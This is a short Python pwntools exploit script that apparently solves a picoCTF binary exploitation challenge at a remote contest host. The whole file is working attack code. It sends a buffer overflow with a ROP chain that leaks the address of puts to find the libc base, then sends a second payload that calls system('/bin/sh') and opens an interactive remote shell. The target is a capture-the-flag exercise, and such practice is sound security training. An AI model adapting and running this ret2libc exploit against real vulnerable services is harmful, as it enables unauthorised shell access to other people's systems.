from pwn import *

elf = context.binary = ELF('./vuln')
libc = ELF('./libc.so.6')
p = remote('mercury.picoctf.net', 23584)

POP_RDI = 0x0000000000400913
RET = 0x000000000040052e

offset = 136
payload = flat(
        'A' * offset,
        POP_RDI,
        elf.got['puts'],
        elf.plt['puts'],
        elf.sym['main'],
)

print(p.clean())
p.sendline(payload)
p.recvline()
print(hex(libc.sym['system']))
print(hex(libc.sym['puts']))
# Getting libc base and calculating the addresses
address = p.recvline()
leak = u64(address.strip().ljust(8, b"\x00"))

print(f"[+] Leaked puts() address: {hex(leak)}")
libc.address = leak - libc.sym['puts']
print(f"[+] Leaked libc address: {hex(libc.address)}")

payload = flat(
        'A' * offset,
        POP_RDI,
        next(libc.search(b'/bin/sh\x00')),
        RET,
        libc.sym['system'],
)

p.sendline(payload)
p.recvline()
p.recvline()
p.interactive()
